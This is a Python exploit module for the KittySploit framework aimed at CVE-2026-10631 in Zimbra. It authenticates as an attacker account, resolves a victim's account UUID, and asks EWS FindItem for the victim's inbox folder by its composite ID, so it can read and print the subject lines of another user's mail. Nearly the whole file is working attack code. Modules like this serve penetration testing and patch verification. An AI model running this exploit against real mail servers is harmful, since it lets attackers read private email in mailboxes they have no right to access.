#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-10631 — EWS FindItem cross-mailbox read."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.zimbra import Zimbra


class Module(Auxiliary, Http_client, Zimbra):
    __info__ = {
        "name": "Zimbra CVE-2026-10631 EWS inbox read",
        "description": (
            "Uses composite folder IDs (victim UUID + _2) in EWS FindItem "
            "to read another user's inbox (fixed in ZCS 10.1.20)."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-10631"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-10631"],
        "tags": ["zimbra", "ews", "idor", "cve-2026-10631"],
        "agent": {
            "approval_required": True,
            "produces": ["sensitive_data"],
            "chain": {"suggested_followups": ["scanner/http/zimbra_cve_2026_10631_detect"]},
        },
    }

    username = OptString("", "Attacker account (EWS enabled)", required=True)
    password = OptString("", "Password", required=True)
    victim = OptString("", "Victim email address on same server", required=True)

    def run(self):
        user = str(self.username or "").strip()
        victim = str(self.victim or "").strip()
        password = str(self.password or "")
        token, _ = self.zimbra_auth(user, password)
        if not token:
            print_error("SOAP auth failed")
            return False
        victim_uuid = self.zimbra_get_account_uuid(token, victim)
        if not victim_uuid:
            print_error("Could not resolve victim zimbraId")
            return False
        folder_id = f"{victim_uuid}_2"
        code, body = self.zimbra_ews_find_item(user, password, folder_id)
        if code != 200:
            print_error("EWS FindItem failed (patched, EWS disabled, or bad creds)")
            return False
        subjects = re.findall(r"<[^:]*Subject>([^<]+)</", body)
        if subjects:
            print_success(f"Read {len(subjects)} subject(s) from {victim} inbox")
            print_status("; ".join(subjects[:5]))
        else:
            print_warning("EWS OK but no messages returned")
        self.set_info(severity="medium", cve="CVE-2026-10631", victim=victim, folder_id=folder_id)
        return True